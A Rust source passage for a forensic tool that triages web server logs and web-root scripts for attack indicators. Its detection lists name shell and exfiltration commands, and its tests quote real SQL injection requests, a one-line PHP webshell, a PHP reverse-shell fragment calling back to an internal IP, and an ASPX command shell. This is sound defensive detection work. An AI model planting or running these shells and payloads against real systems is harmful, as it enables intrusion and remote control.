//! `web_triage` — parse web-tier artifacts (server request logs and web-root
//! scripts) carved off a disk image.
//!
//! Why this is a tool and not orchestrator-side parsing: every Finding this
//! engine emits cites a `tool_call_id` that `verify_finding` re-runs against the
//! Rust MCP server and compares byte-for-byte (`services/agent/findevil_agent/
//! verifier.py`). A claim assembled in the Python orchestrator from a file it
//! read itself has no replayable call behind it, so it cannot survive
//! verification. The same reasoning added `oe_dbx_parse`: no other product tool
//! reads the format, so the lane needs its own typed, deterministic reader.
//!
//! Scope discipline: this reader reports *observations* (which request lines
//! carry which exploit indicator, which script lines carry which shell
//! primitive). It assigns no confidence and names no actor — the orchestrator
//! decides what tier a finding earns, as it does for every other lane.
//!
//! Determinism: output depends only on the file bytes and the declared limit —
//! no clock, no environment, no filesystem walk — so replay reproduces the same
//! SHA-256.

use std::collections::BTreeMap;
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::path::{Path, PathBuf};

use chrono::{NaiveDateTime, TimeZone, Utc};
use schemars::JsonSchema;
use serde::{Deserialize, Serialize};
use thiserror::Error;

/// Default cap on returned hits. The counts stay exact above it.
const DEFAULT_LIMIT: usize = 200;
/// Stop reading a pathological artifact rather than buffering it all.
const MAX_LINES: usize = 2_000_000;
/// Longest source line kept for a snippet (bytes, not chars).
const MAX_SNIPPET_BYTES: usize = 240;
/// Lines inspected when auto-detecting an access log.
const DETECT_LINES: usize = 200;

/// Server-side script extensions. A file with one of these is treated as a
/// web-root script; anything else is sniffed as a request log.
const SCRIPT_EXTENSIONS: &[&str] = &[
    "php", "php3", "php4", "php5", "php7", "phps", "phtml", "asp", "aspx", "ashx", "asmx", "jsp",
    "jspx", "jspf", "cfm", "cgi", "pl",
];

#[derive(Clone, Debug, Deserialize, Serialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct WebTriageInput {
    /// Case ID from a prior `case_open` call — recorded for audit tracing.
    pub case_id: String,
    /// Path to the extracted web-tier artifact (an access/error log, or a
    /// server-side script carved out of a web root).
    pub artifact_path: PathBuf,
    /// Maximum hits returned. Counts are exact regardless. Defaults to 200.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub limit: Option<usize>,
}

#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
pub struct WebRequestHit {
    pub line_number: usize,
    /// The stamp exactly as the server wrote it.
    pub timestamp: String,
    /// The same instant normalized to UTC ISO-8601, or empty when the stamp did
    /// not parse. The engine's timeline only accepts ISO, so without this the
    /// web lane could not line up with the MFT/EVTX lanes.
    pub timestamp_iso: String,
    pub client_ip: String,
    pub method: String,
    pub target: String,
    pub status: String,
    pub user_agent: String,
    /// Indicator names that fired on this request, sorted.
    pub indicators: Vec<String>,
}

#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
pub struct WebScriptHit {
    pub line_number: usize,
    pub indicator: String,
    pub snippet: String,
}

#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
pub struct WebIndicatorCount {
    pub indicator: String,
    pub count: usize,
}

#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
pub struct WebClientCount {
    pub client_ip: String,
    pub count: usize,
}

#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
pub struct WebTriageOutput {
    pub artifact_path: String,
    /// `access_log`, `webroot_script`, or `unknown`.
    pub artifact_kind: String,
    pub lines_seen: usize,
    /// Request lines that parsed as a known access-log format.
    pub requests_parsed: usize,
    pub parse_errors: usize,
    /// True when hits were dropped to honour `limit`, or the read stopped early.
    pub truncated: bool,

    // --- access_log ---
    pub exploit_hits: Vec<WebRequestHit>,
    /// Exact number of flagged requests, even when `exploit_hits` was capped.
    pub exploit_hit_count: usize,
    pub indicator_counts: Vec<WebIndicatorCount>,
    /// Clients that issued at least one flagged request.
    pub attacker_clients: Vec<WebClientCount>,

    // --- webroot_script ---
    pub script_hits: Vec<WebScriptHit>,
    pub script_indicator_counts: Vec<WebIndicatorCount>,
    /// True when the script's indicator combination matches a webshell pattern
    /// (request-driven command execution, an exec/eval primitive paired with
    /// obfuscation / a reverse-shell socket / error suppression, or an
    /// ASP/.NET process-launch primitive).
    pub is_probable_webshell: bool,
}

#[derive(Debug, Error)]
pub enum WebTriageError {
    #[error("web artifact not found: {0}")]
    NotFound(PathBuf),
    #[error("web artifact is not a regular file: {0}")]
    NotRegular(PathBuf),
    #[error("web artifact unreadable {path}: {source}")]
    Unreadable {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },
}

pub fn web_triage(input: &WebTriageInput) -> Result<WebTriageOutput, WebTriageError> {
    let path = &input.artifact_path;
    if !path.exists() {
        return Err(WebTriageError::NotFound(path.clone()));
    }
    if !path.is_file() {
        return Err(WebTriageError::NotRegular(path.clone()));
    }
    let limit = input.limit.unwrap_or(DEFAULT_LIMIT);
    let lines = read_lines(path)?;
    let mut out = WebTriageOutput {
        artifact_path: path.to_string_lossy().to_string(),
        artifact_kind: "unknown".to_string(),
        lines_seen: lines.len(),
        requests_parsed: 0,
        parse_errors: 0,
        truncated: lines.len() >= MAX_LINES,
        exploit_hits: Vec::new(),
        exploit_hit_count: 0,
        indicator_counts: Vec::new(),
        attacker_clients: Vec::new(),
        script_hits: Vec::new(),
        script_indicator_counts: Vec::new(),
        is_probable_webshell: false,
    };

    if path_is_server_script(path) {
        out.artifact_kind = "webroot_script".to_string();
        scan_script(&lines, limit, &mut out);
    } else if looks_like_access_log(&lines) {
        out.artifact_kind = "access_log".to_string();
        scan_access_log(&lines, limit, &mut out);
    }
    Ok(out)
}

fn read_lines(path: &Path) -> Result<Vec<String>, WebTriageError> {
    let file = File::open(path).map_err(|source| WebTriageError::Unreadable {
        path: path.to_path_buf(),
        source,
    })?;
    let mut reader = BufReader::new(file);
    let mut lines = Vec::new();
    let mut buf: Vec<u8> = Vec::new();
    while lines.len() < MAX_LINES {
        buf.clear();
        let read =
            reader
                .read_until(b'\n', &mut buf)
                .map_err(|source| WebTriageError::Unreadable {
                    path: path.to_path_buf(),
                    source,
                })?;
        if read == 0 {
            break;
        }
        while matches!(buf.last(), Some(b'\n' | b'\r')) {
            buf.pop();
        }
        lines.push(String::from_utf8_lossy(&buf).to_string());
    }
    Ok(lines)
}

fn path_is_server_script(path: &Path) -> bool {
    path.extension()
        .map(|e| e.to_string_lossy().to_ascii_lowercase())
        .is_some_and(|ext| SCRIPT_EXTENSIONS.contains(&ext.as_str()))
}

// ---------------------------------------------------------------------------
// Access logs
// ---------------------------------------------------------------------------

/// One parsed request, format-independent.
struct ParsedRequest {
    timestamp: String,
    timestamp_iso: String,
    client_ip: String,
    method: String,
    target: String,
    status: String,
    user_agent: String,
}

fn looks_like_access_log(lines: &[String]) -> bool {
    let mut fields: Option<Vec<String>> = None;
    for line in lines.iter().take(DETECT_LINES) {
        if let Some(f) = w3c_fields_directive(line) {
            if f.iter().any(|c| c == "cs-method" || c == "cs-uri-stem") {
                return true;
            }
            fields = Some(f);
            continue;
        }
        if line.trim().is_empty() || line.starts_with('#') {
            continue;
        }
        if parse_combined(line).is_some() {
            return true;
        }
        if let Some(f) = fields.as_ref() {
            if parse_w3c(line, f).is_some() {
                return true;
            }
        }
    }
    false
}

fn w3c_fields_directive(line: &str) -> Option<Vec<String>> {
    let rest = line
        .strip_prefix("#Fields:")
        .or_else(|| line.strip_prefix("#fields:"))?;
    Some(
        rest.split_whitespace()
            .map(str::to_ascii_lowercase)
            .collect(),
    )
}

/// Apache/nginx common + combined log format:
/// `host ident authuser [timestamp] "METHOD target proto" status bytes ["ref" "ua"]`
fn parse_combined(line: &str) -> Option<ParsedRequest> {
    let open = line.find('[')?;
    let close = line[open..].find(']')? + open;
    let client_ip = line[..open].split_whitespace().next()?.to_string();
    if client_ip.is_empty() {
        return None;
    }
    let timestamp = line[open + 1..close].to_string();
    let quoted = quoted_segments(&line[close + 1..]);
    let request = quoted.first()?;
    let mut parts = request.split_whitespace();
    let method = parts.next()?.to_string();
    let target = parts.next().unwrap_or("").to_string();
    if method.is_empty() || !method.chars().all(|c| c.is_ascii_alphabetic()) {
        return None;
    }
    // Status is the first bare token after the closing quote of the request.
    let after_request = line[close + 1..]
        .split_once(&format!("\"{request}\""))
        .map_or("", |(_, rest)| rest);
    let status = after_request
        .split_whitespace()
        .next()
        .unwrap_or("")
        .to_string();
    let user_agent = quoted.get(2).cloned().unwrap_or_default();
    Some(ParsedRequest {
        timestamp_iso: normalize_clf_timestamp(&timestamp),
        timestamp,
        client_ip,
        method,
        target,
        status,
        user_agent,
    })
}

/// Split out the `"..."`-delimited segments of a log line, in order.
fn quoted_segments(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut current: Option<String> = None;
    for ch in text.chars() {
        match (ch, current.as_mut()) {
            ('"', None) => current = Some(String::new()),
            ('"', Some(_)) => out.push(current.take().unwrap_or_default()),
            (c, Some(buf)) => buf.push(c),
            _ => {}
        }
    }
    out
}

/// IIS W3C extended log format, driven by the `#Fields:` directive.
fn parse_w3c(line: &str, fields: &[String]) -> Option<ParsedRequest> {
    let values: Vec<&str> = line.split_whitespace().collect();
    if values.len() != fields.len() {
        return None;
    }
    let get = |name: &str| -> String {
        fields
            .iter()
            .position(|f| f == name)
            .and_then(|i| values.get(i))
            .map(|v| (*v).to_string())
            .unwrap_or_default()
    };
    let method = get("cs-method");
    let stem = get("cs-uri-stem");
    if method.is_empty() && stem.is_empty() {
        return None;
    }
    let query = get("cs-uri-query");
    let target = if query.is_empty() || query == "-" {
        stem
    } else {
        format!("{stem}?{query}")
    };
    let timestamp = [get("date"), get("time")]
        .into_iter()
        .filter(|s| !s.is_empty() && s != "-")
        .collect::<Vec<_>>()
        .join(" ");
    let client_ip = {
        let c = get("c-ip");
        if c.is_empty() {
            get("s-ip")
        } else {
            c
        }
    };
    Some(ParsedRequest {
        timestamp_iso: normalize_w3c_timestamp(&timestamp),
        timestamp,
        client_ip,
        method,
        target,
        // IIS escapes spaces in the UA as '+'.
        status: get("sc-status"),
        user_agent: get("cs(user-agent)").replace('+', " "),
    })
}

/// `10/Oct/2000:13:55:36 -0700` (Apache/nginx common log format) -> UTC ISO.
/// Returns an empty string rather than a guess when the stamp does not parse.
fn normalize_clf_timestamp(raw: &str) -> String {
    chrono::DateTime::parse_from_str(raw.trim(), "%d/%b/%Y:%H:%M:%S %z")
        .map(|dt| {
            dt.with_timezone(&Utc)
                .format("%Y-%m-%dT%H:%M:%SZ")
                .to_string()
        })
        .unwrap_or_default()
}

/// `2015-09-02 04:05:00` (IIS W3C, always UTC per the spec) -> ISO.
fn normalize_w3c_timestamp(raw: &str) -> String {
    NaiveDateTime::parse_from_str(raw.trim(), "%Y-%m-%d %H:%M:%S")
        .ok()
        .and_then(|naive| Utc.from_local_datetime(&naive).single())
        .map(|dt| dt.format("%Y-%m-%dT%H:%M:%SZ").to_string())
        .unwrap_or_default()
}

fn scan_access_log(lines: &[String], limit: usize, out: &mut WebTriageOutput) {
    let mut fields: Option<Vec<String>> = None;
    let mut indicator_counts: BTreeMap<String, usize> = BTreeMap::new();
    let mut client_counts: BTreeMap<String, usize> = BTreeMap::new();
    for (index, line) in lines.iter().enumerate() {
        if let Some(f) = w3c_fields_directive(line) {
            fields = Some(f);
            continue;
        }
        if line.trim().is_empty() || line.starts_with('#') {
            continue;
        }
        let parsed =
            parse_combined(line).or_else(|| fields.as_ref().and_then(|f| parse_w3c(line, f)));
        let Some(request) = parsed else {
            out.parse_errors += 1;
            continue;
        };
        out.requests_parsed += 1;
        let indicators = request_indicators(&request);
        if indicators.is_empty() {
            continue;
        }
        out.exploit_hit_count += 1;
        for indicator in &indicators {
            *indicator_counts.entry(indicator.clone()).or_insert(0) += 1;
        }
        if !request.client_ip.is_empty() {
            *client_counts.entry(request.client_ip.clone()).or_insert(0) += 1;
        }
        if out.exploit_hits.len() < limit {
            out.exploit_hits.push(WebRequestHit {
                line_number: index + 1,
                timestamp: request.timestamp,
                timestamp_iso: request.timestamp_iso,
                client_ip: request.client_ip,
                method: request.method,
                target: truncate_snippet(&request.target),
                status: request.status,
                user_agent: truncate_snippet(&request.user_agent),
                indicators,
            });
        } else {
            out.truncated = true;
        }
    }
    out.indicator_counts = rank_counts(indicator_counts)
        .into_iter()
        .map(|(indicator, count)| WebIndicatorCount { indicator, count })
        .collect();
    out.attacker_clients = rank_counts(client_counts)
        .into_iter()
        .map(|(client_ip, count)| WebClientCount { client_ip, count })
        .collect();
}

/// Exploit indicators for one request. Names are stable identifiers the
/// orchestrator keys off; each one is a behaviour, not a case-specific string.
fn request_indicators(request: &ParsedRequest) -> Vec<String> {
    let raw = request.target.to_ascii_lowercase();
    let decoded = percent_decode(&raw);
    let squeezed: String = decoded.chars().filter(|c| !c.is_whitespace()).collect();
    let agent = request.user_agent.to_ascii_lowercase();
    let mut hits: Vec<String> = Vec::new();

    if let Some(union_at) = decoded.find("union") {
        if decoded[union_at..].contains("select") {
            hits.push("sqli_union_select".to_string());
        }
    }
    if [
        "or1=1",
        "or1=1--",
        "or'1'='1",
        "or\"1\"=\"1",
        "or1<2",
        "or1like1",
        "')or('",
    ]
    .iter()
    .any(|needle| squeezed.contains(needle))
    {
        hits.push("sqli_boolean_tautology".to_string());
    }
    if decoded.contains("information_schema") {
        hits.push("sqli_information_schema".to_string());
    }
    if [
        "version()",
        "database()",
        "user()",
        "@@version",
        "load_file(",
        "into outfile",
        "into dumpfile",
        "group_concat(",
        "sleep(",
        "benchmark(",
        "extractvalue(",
        "updatexml(",
    ]
    .iter()
    .any(|needle| decoded.contains(needle))
    {
        hits.push("sqli_meta_function".to_string());
    }
    if decoded.contains("-- ") || decoded.ends_with("--") || decoded.contains("/*!") {
        hits.push("sql_comment_terminator".to_string());
    }
    if raw.contains("%27") || raw.contains("%22") || raw.contains("%2527") {
        hits.push("encoded_quote".to_string());
    }
    if decoded.contains("../") || decoded.contains("..\\") {
        hits.push("path_traversal".to_string());
    }
    if request_is_webshell_invocation(&decoded) {
        hits.push("webshell_invocation".to_string());
    }
    if request_is_command_injection(&decoded) {
        hits.push("command_injection".to_string());
    }
    if [
        "sqlmap",
        "nikto",
        "havij",
        "acunetix",
        "nessus",
        "dirbuster",
        "gobuster",
        "wpscan",
        "masscan",
        "zgrab",
        "openvas",
        "w3af",
        "hydra",
        "metasploit",
        "nmap scripting engine",
    ]
    .iter()
    .any(|needle| agent.contains(needle))
    {
        hits.push("scanner_user_agent".to_string());
    }

    // A quote/comment on its own is noisy — it only counts alongside a
    // structural indicator, so ordinary URLs do not become "attacks".
    let structural = hits
        .iter()
        .any(|h| h != "encoded_quote" && h != "sql_comment_terminator");
    if !structural {
        hits.clear();
    }
    hits.sort();
    hits.dedup();
    hits
}

const SHELL_COMMAND_TOKENS: &[&str] = &[
    "whoami",
    "ipconfig",
    "ifconfig",
    "/bin/sh",
    "/bin/bash",
    "cmd.exe",
    "powershell",
    "net user",
    "cat /etc/passwd",
    "wget http",
    "curl http",
    "nc -e",
];

fn request_is_webshell_invocation(decoded: &str) -> bool {
    let (path, query) = decoded.split_once('?').unwrap_or((decoded, ""));
    let is_script = SCRIPT_EXTENSIONS
        .iter()
        .any(|ext| path.ends_with(&format!(".{ext}")));
    if !is_script || query.is_empty() {
        return false;
    }
    ["cmd=", "command=", "exec=", "shell=", "act=", "download="]
        .iter()
        .any(|p| query.contains(p))
        || SHELL_COMMAND_TOKENS.iter().any(|t| query.contains(t))
}

fn request_is_command_injection(decoded: &str) -> bool {
    let metachar = [";", "|", "&&", "`", "$("]
        .iter()
        .any(|m| decoded.contains(m));
    metachar && SHELL_COMMAND_TOKENS.iter().any(|t| decoded.contains(t))
}

/// Percent-decode plus `+` → space, the two encodings a web parameter carries.
/// Applied twice so a double-encoded payload (`%2527`) also normalizes.
fn percent_decode(text: &str) -> String {
    let once = decode_once(&text.replace('+', " "));
    if once.contains('%') {
        decode_once(&once)
    } else {
        once
    }
}

fn decode_once(text: &str) -> String {
    let bytes = text.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            let hex = &text[i + 1..i + 3];
            if let Ok(byte) = u8::from_str_radix(hex, 16) {
                out.push(byte);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).to_ascii_lowercase()
}

// ---------------------------------------------------------------------------
// Web-root scripts
// ---------------------------------------------------------------------------

/// (indicator, needles) — a line carrying any needle raises the indicator.
const SCRIPT_INDICATORS: &[(&str, &[&str])] = &[
    (
        "php_command_exec",
        &[
            "system(",
            "shell_exec(",
            "passthru(",
            "popen(",
            "proc_open(",
            "pcntl_exec(",
            "exec(",
        ],
    ),
    (
        "php_eval",
        &["eval(", "assert(", "create_function(", "preg_replace"],
    ),
    (
        "obfuscated_decode",
        &[
            "base64_decode(",
            "gzinflate(",
            "gzuncompress(",
            "str_rot13(",
            "hex2bin(",
        ],
    ),
    (
        // No trailing `(`: PHP reverse shells routinely dispatch these
        // dynamically (`$f = 'fsockopen'; $s = $f($ip, $port);`) so the
        // literal call never appears. A raw TCP client primitive named
        // anywhere in a web-root script is the observation worth reporting.
        "reverse_shell_socket",
        &[
            "fsockopen",
            "pfsockopen",
            "stream_socket_client",
            "socket_create",
            "socket_connect",
        ],
    ),
    (
        "error_suppression",
        &["error_reporting(0)", "@eval(", "@system(", "@shell_exec("],
    ),
    (
        "dotnet_process_start",
        &[
            "process.start(",
            "wscript.shell",
            "cmd.exe /c",
            "runtime.getruntime().exec",
        ],
    ),
    (
        "asp_eval",
        &["eval(request", "execute(request", "executeglobal("],
    ),
    (
        "file_upload_primitive",
        &["move_uploaded_file(", "file_put_contents("],
    ),
];

const REQUEST_SUPERGLOBALS: &[&str] = &[
    "$_get",
    "$_post",
    "$_request",
    "$_cookie",
    "$_files",
    "$_server['http_",
    "request.querystring",
    "request.form",
    "request[\"",
    "request.getparameter(",
];

const EXEC_PRIMITIVES: &[&str] = &[
    "system(",
    "shell_exec(",
    "passthru(",
    "popen(",
    "proc_open(",
    "pcntl_exec(",
    "exec(",
    "eval(",
    "assert(",
    "create_function(",
    "process.start(",
    "wscript.shell",
];

fn scan_script(lines: &[String], limit: usize, out: &mut WebTriageOutput) {
    let mut counts: BTreeMap<String, usize> = BTreeMap::new();
    for (index, line) in lines.iter().enumerate() {
        let lower = line.to_ascii_lowercase();
        let mut names: Vec<&str> = Vec::new();
        for (indicator, needles) in SCRIPT_INDICATORS {
            if needles.iter().any(|needle| lower.contains(needle)) {
                names.push(indicator);
            }
        }
        // Request input reaching an execution primitive ON THE SAME LINE is the
        // webshell signature proper — it separates a dropped shell from
        // application source that merely happens to call a shell somewhere.
        if REQUEST_SUPERGLOBALS.iter().any(|s| lower.contains(s))
            && EXEC_PRIMITIVES.iter().any(|p| lower.contains(p))
        {
            names.push("request_driven_exec");
        }
        for name in names {
            *counts.entry(name.to_string()).or_insert(0) += 1;
            if out.script_hits.len() < limit {
                out.script_hits.push(WebScriptHit {
                    line_number: index + 1,
                    indicator: name.to_string(),
                    snippet: truncate_snippet(line.trim()),
                });
            } else {
                out.truncated = true;
            }
        }
    }
    let has = |name: &str| counts.contains_key(name);
    out.is_probable_webshell = has("request_driven_exec")
        || has("dotnet_process_start")
        || has("asp_eval")
        || ((has("php_eval") || has("php_command_exec"))
            && (has("obfuscated_decode")
                || has("reverse_shell_socket")
                || has("error_suppression")));
    out.script_indicator_counts = rank_counts(counts)
        .into_iter()
        .map(|(indicator, count)| WebIndicatorCount { indicator, count })
        .collect();
}

// ---------------------------------------------------------------------------
// Shared helpers
// ---------------------------------------------------------------------------

/// Descending count, then name — a total order, so replay is byte-stable.
fn rank_counts(counts: BTreeMap<String, usize>) -> Vec<(String, usize)> {
    let mut ranked: Vec<(String, usize)> = counts.into_iter().collect();
    ranked.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
    ranked
}

fn truncate_snippet(text: &str) -> String {
    if text.len() <= MAX_SNIPPET_BYTES {
        return text.to_string();
    }
    let mut end = MAX_SNIPPET_BYTES;
    while end > 0 && !text.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}...", &text[..end])
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    static SEQ: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

    /// One directory per call: cargo runs tests in parallel threads and several
    /// of them use the same artifact name, so a shared path races.
    fn tmp_file(name: &str, body: &str) -> PathBuf {
        let seq = SEQ.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        let dir = std::env::temp_dir().join(format!("web-triage-{}-{seq}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join(name);
        let mut fh = std::fs::File::create(&path).unwrap();
        fh.write_all(body.as_bytes()).unwrap();
        path
    }

    fn run(path: &Path) -> WebTriageOutput {
        web_triage(&WebTriageInput {
            case_id: "case-web".into(),
            artifact_path: path.to_path_buf(),
            limit: None,
        })
        .unwrap()
    }

    // Verbatim lines from the Ali Hadi case-1 Apache access.log (inode 59684),
    // recovered with `icat`. Combined log format.
    const REAL_SQLI: &str = concat!(
        "::1 - - [23/Aug/2015:14:46:24 -0700] \"GET / HTTP/1.1\" 302 - \"-\" \"Mozilla/4.0 (compatible; MSIE 7.0)\"\n",
        "192.168.56.102 - - [02/Sep/2015:03:49:53 -0700] \"GET /dvwa/vulnerabilities/sqli/?id=a%27+or+1%3D1&Submit=Submit HTTP/1.1\" 200 159 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Iceweasel/38.2.0\"\n",
        "192.168.56.102 - - [02/Sep/2015:04:05:00 -0700] \"GET /dvwa/vulnerabilities/sqli/?id=abc%27+and+0%3D0+union+select+table_name%2C+null+from+information_schema.tables+--+&Submit=Submit HTTP/1.1\" 200 26752 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Iceweasel/38.2.0\"\n",
        "192.168.56.102 - - [02/Sep/2015:04:15:40 -0700] \"GET /dvwa/vulnerabilities/sqli/?id=2&Submit=Submit HTTP/1.1\" 302 1 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\"\n",
    );

    #[test]
    fn access_log_is_detected_and_parsed_as_combined_format() {
        let path = tmp_file("access.log", REAL_SQLI);
        let out = run(&path);
        assert_eq!(out.artifact_kind, "access_log");
        assert_eq!(out.lines_seen, 4);
        assert_eq!(out.requests_parsed, 4);
    }

    #[test]
    fn union_select_and_information_schema_are_flagged_on_the_real_payload() {
        let path = tmp_file("access.log", REAL_SQLI);
        let out = run(&path);
        let inds: Vec<&str> = out
            .exploit_hits
            .iter()
            .flat_map(|h| h.indicators.iter().map(String::as_str))
            .collect();
        assert!(inds.contains(&"sqli_union_select"), "{inds:?}");
        assert!(inds.contains(&"sqli_information_schema"), "{inds:?}");
        assert!(inds.contains(&"sqli_boolean_tautology"), "{inds:?}");
        assert!(inds.contains(&"encoded_quote"), "{inds:?}");
        assert!(inds.contains(&"scanner_user_agent"), "{inds:?}");
    }

    #[test]
    fn benign_requests_are_not_flagged() {
        let path = tmp_file("access.log", REAL_SQLI);
        let out = run(&path);
        // The first line is an ordinary GET / — it must not appear as a hit.
        assert!(
            out.exploit_hits.iter().all(|h| h.line_number != 1),
            "benign GET / was flagged: {:?}",
            out.exploit_hits
        );
        assert_eq!(out.exploit_hit_count, 3);
    }

    #[test]
    fn hits_carry_the_client_ip_method_status_and_line_number() {
        let path = tmp_file("access.log", REAL_SQLI);
        let out = run(&path);
        let first = &out.exploit_hits[0];
        assert_eq!(first.line_number, 2);
        assert_eq!(first.client_ip, "192.168.56.102");
        assert_eq!(first.method, "GET");
        assert_eq!(first.status, "200");
        assert_eq!(first.timestamp, "02/Sep/2015:03:49:53 -0700");
        assert!(first.target.contains("/dvwa/vulnerabilities/sqli/"));
    }

    #[test]
    fn client_ip_and_indicator_counts_are_aggregated_deterministically() {
        let path = tmp_file("access.log", REAL_SQLI);
        let out = run(&path);
        assert_eq!(out.attacker_clients.len(), 1);
        assert_eq!(out.attacker_clients[0].client_ip, "192.168.56.102");
        assert_eq!(out.attacker_clients[0].count, 3);
        // Counts sort by descending count then name, so replay is byte-stable.
        assert!(!out.indicator_counts.is_empty());
        assert_eq!(
            run(&path).indicator_counts,
            out.indicator_counts,
            "output must be reproducible for verifier replay"
        );
    }

    #[test]
    fn iis_w3c_log_is_parsed_with_its_field_directive() {
        let body = "#Software: Microsoft Internet Information Services 8.5\n\
             #Fields: date time s-ip cs-method cs-uri-stem cs-uri-query c-ip cs(User-Agent) sc-status\n\
             2015-09-02 04:05:00 10.0.0.5 GET /app/item.aspx id=1'+union+select+null,null+from+information_schema.tables 10.0.0.9 Mozilla/5.0 200\n";
        let path = tmp_file("u_ex150902.log", body);
        let out = run(&path);
        assert_eq!(out.artifact_kind, "access_log");
        assert_eq!(out.exploit_hit_count, 1);
        let hit = &out.exploit_hits[0];
        assert_eq!(hit.client_ip, "10.0.0.9");
        assert_eq!(hit.method, "GET");
        assert_eq!(hit.status, "200");
        assert!(hit.indicators.iter().any(|i| i == "sqli_union_select"));
    }

    #[test]
    fn traversal_and_webshell_invocation_are_flagged_without_sql() {
        let body = "10.0.0.9 - - [02/Sep/2015:05:00:00 -0700] \"GET /uploads/phpshell.php?cmd=whoami HTTP/1.1\" 200 12 \"-\" \"curl/7.0\"\n\
             10.0.0.9 - - [02/Sep/2015:05:00:01 -0700] \"GET /app/?file=../../../../windows/win.ini HTTP/1.1\" 200 12 \"-\" \"curl/7.0\"\n";
        let path = tmp_file("access2.log", body);
        let out = run(&path);
        assert_eq!(out.exploit_hit_count, 2);
        assert!(out.exploit_hits[0]
            .indicators
            .iter()
            .any(|i| i == "webshell_invocation"));
        assert!(out.exploit_hits[1]
            .indicators
            .iter()
            .any(|i| i == "path_traversal"));
    }

    // Verbatim contents of xampp/htdocs/DVWA/hackable/uploads/phpshell.php
    // (inode 62330) on the Ali Hadi case-1 image.
    const REAL_SHELL_1: &str = "<?php\nsystem($_GET[\"cmd\"]);\n\n?>\n";

    // Verbatim head of phpshell2.php (inode 62337) — a PHP reverse shell.
    const REAL_SHELL_2: &str = "//<?php error_reporting(0); $ip = '192.168.56.102'; $port = 4545; \
         if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f(\"tcp://{$ip}:{$port}\"); } \
         elseif (($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); } \
         elseif (($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); } \
         eval($b); die();\n";

    #[test]
    fn php_script_with_request_driven_system_call_is_a_probable_webshell() {
        let path = tmp_file("phpshell.php", REAL_SHELL_1);
        let out = run(&path);
        assert_eq!(out.artifact_kind, "webroot_script");
        assert!(out.is_probable_webshell);
        let names: Vec<&str> = out
            .script_hits
            .iter()
            .map(|h| h.indicator.as_str())
            .collect();
        assert!(names.contains(&"php_command_exec"), "{names:?}");
        assert!(names.contains(&"request_driven_exec"), "{names:?}");
        assert!(out
            .script_hits
            .iter()
            .any(|h| h.snippet.contains("system(")));
    }

    #[test]
    fn php_reverse_shell_is_a_probable_webshell() {
        let path = tmp_file("phpshell2.php", REAL_SHELL_2);
        let out = run(&path);
        assert!(out.is_probable_webshell);
        let names: Vec<&str> = out
            .script_hits
            .iter()
            .map(|h| h.indicator.as_str())
            .collect();
        assert!(names.contains(&"php_eval"), "{names:?}");
        assert!(names.contains(&"reverse_shell_socket"), "{names:?}");
        assert!(names.contains(&"error_suppression"), "{names:?}");
    }

    #[test]
    fn ordinary_application_php_is_not_a_probable_webshell() {
        let body = "<?php\n\
             $id = $_GET['id'];\n\
             $rows = mysqli_query($conn, \"SELECT first_name FROM users WHERE user_id = '$id'\");\n\
             while ($r = mysqli_fetch_assoc($rows)) { echo htmlspecialchars($r['first_name']); }\n\
             ?>\n";
        let path = tmp_file("view.php", body);
        let out = run(&path);
        assert_eq!(out.artifact_kind, "webroot_script");
        assert!(
            !out.is_probable_webshell,
            "SQL-injectable app source is not a webshell: {:?}",
            out.script_hits
        );
    }

    #[test]
    fn aspx_shell_primitives_are_flagged() {
        let body = "<%@ Page Language=\"C#\" %>\n\
             <% System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request[\"cmd\"]); %>\n";
        let path = tmp_file("cmd.aspx", body);
        let out = run(&path);
        assert!(out.is_probable_webshell);
        let names: Vec<&str> = out
            .script_hits
            .iter()
            .map(|h| h.indicator.as_str())
            .collect();
        assert!(names.contains(&"dotnet_process_start"), "{names:?}");
    }

    #[test]
    fn hits_carry_a_normalized_iso_timestamp_for_cross_lane_correlation() {
        // The raw Apache stamp is kept verbatim, but the engine's timeline only
        // accepts ISO-8601, so an un-normalized hit would be silently dropped
        // and the web lane could never line up with the MFT/EVTX lanes.
        let path = tmp_file("access-iso.log", REAL_SQLI);
        let out = run(&path);
        let first = &out.exploit_hits[0];
        assert_eq!(first.timestamp, "02/Sep/2015:03:49:53 -0700");
        // -0700 -> UTC
        assert_eq!(first.timestamp_iso, "2015-09-02T10:49:53Z");

        let body = "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query c-ip cs(User-Agent) sc-status\n\
             2015-09-02 04:05:00 10.0.0.5 GET /a.aspx id=1'+union+select+null 10.0.0.9 Mozilla/5.0 200\n";
        let w3c = run(&tmp_file("u_ex150902-iso.log", body));
        assert_eq!(w3c.exploit_hits[0].timestamp_iso, "2015-09-02T04:05:00Z");

        // An unparseable stamp yields an empty ISO field rather than a guess.
